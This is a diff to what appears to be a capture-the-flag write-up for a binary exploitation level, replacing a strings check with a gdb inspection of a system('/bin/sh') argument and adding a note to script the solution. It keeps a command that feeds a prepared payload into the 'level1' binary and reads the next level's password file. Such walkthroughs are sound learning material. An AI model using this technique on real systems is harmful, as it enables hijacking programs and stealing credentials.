@@ -73,14 +73,11 @@ Disassemble this function
 
 There is a `system()` call
 
-Check the strings in the program
+Check the argument of system
 
-	$ strings level1
-	...
-	/bin/sh
-	...
+	(gdb) x/s 0x8048584
+	0x8048584:	 "/bin/sh"
 
-We can assume that there is a `system("/bin/sh")`
 
 We need to force the call to the "run" function
 
@@ -161,3 +158,5 @@ Ok it's works
 $ (cat /tmp/payload ; cat /home/user/level2/.pass) | ./level1
 
 Done!
+
+Script it for reproduice!
